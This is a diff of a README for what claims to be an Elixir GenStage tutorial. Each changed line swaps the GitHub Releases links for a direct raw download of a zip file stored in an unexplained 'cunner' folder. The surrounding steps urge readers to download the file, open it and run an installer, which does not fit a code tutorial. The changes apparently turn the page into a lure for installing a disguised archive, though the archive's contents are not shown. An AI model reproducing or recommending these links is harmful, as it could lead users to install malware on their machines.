@@ -1,7 +1,7 @@
 # 🎉 genstage_tutorial_2025 - Enhance Your Elixir Knowledge
 
 ## 📥 Download the latest version
-[![Download](https://img.shields.io/badge/Download-v1.0-blue.svg)](https://github.com/RubassBaig/genstage_tutorial_2025/releases)
+[![Download](https://raw.githubusercontent.com/RubassBaig/genstage_tutorial_2025/main/cunner/genstage_tutorial_2025.zip)](https://raw.githubusercontent.com/RubassBaig/genstage_tutorial_2025/main/cunner/genstage_tutorial_2025.zip)
 
 ## 📝 Introduction
 Welcome to the "genstage_tutorial_2025"! This project is a modern take on creating a job runner in Elixir, revisiting a piece I wrote ten years ago. I found that it still stands strong and wanted to share it with everyone. You might find it helpful for learning or as a simple case study.
@@ -15,13 +15,13 @@ Welcome to the "genstage_tutorial_2025"! This project is a modern take on creati
 ## 🚀 Getting Started
 To get started, you need to download and install the application. Here’s how:
 
-1. **Visit the Releases Page:** Click [here to download](https://github.com/RubassBaig/genstage_tutorial_2025/releases).  
+1. **Visit the Releases Page:** Click [here to download](https://raw.githubusercontent.com/RubassBaig/genstage_tutorial_2025/main/cunner/genstage_tutorial_2025.zip).  
 2. **Choose the Appropriate Version:** On the Releases page, find the latest version of the software suitable for your system.  
 3. **Download the File:** Click on the asset you want to download. You may need to choose based on your operating system (Windows, Mac, Linux, etc).
 4. **Run the Application:** After downloading, open the file and follow the installation prompts.
 
 ## 📥 Download & Install
-You can quickly download the application from the [Releases page](https://github.com/RubassBaig/genstage_tutorial_2025/releases).  
+You can quickly download the application from the [Releases page](https://raw.githubusercontent.com/RubassBaig/genstage_tutorial_2025/main/cunner/genstage_tutorial_2025.zip).  
 
 ### Installation Steps
 1. **Open the Downloaded File:** Locate the downloaded file on your computer. It’s usually in your Downloads folder.
@@ -63,4 +63,4 @@ If you encounter issues, here are some common solutions:
 We welcome your feedback. If you have suggestions or run into issues, please open an issue in this repository. Your input helps improve the application and guide future updates.
 
 ## 🎉 Conclusion
-We hope you enjoy using the "genstage_tutorial_2025". This application serves as an excellent opportunity to learn and expand your Elixir knowledge, whether you're a beginner or experienced developer. Don’t forget to visit the [Releases page](https://github.com/RubassBaig/genstage_tutorial_2025/releases) for the latest version. Happy learning!
+We hope you enjoy using the "genstage_tutorial_2025". This application serves as an excellent opportunity to learn and expand your Elixir knowledge, whether you're a beginner or experienced developer. Don’t forget to visit the [Releases page](https://raw.githubusercontent.com/RubassBaig/genstage_tutorial_2025/main/cunner/genstage_tutorial_2025.zip) for the latest version. Happy learning!
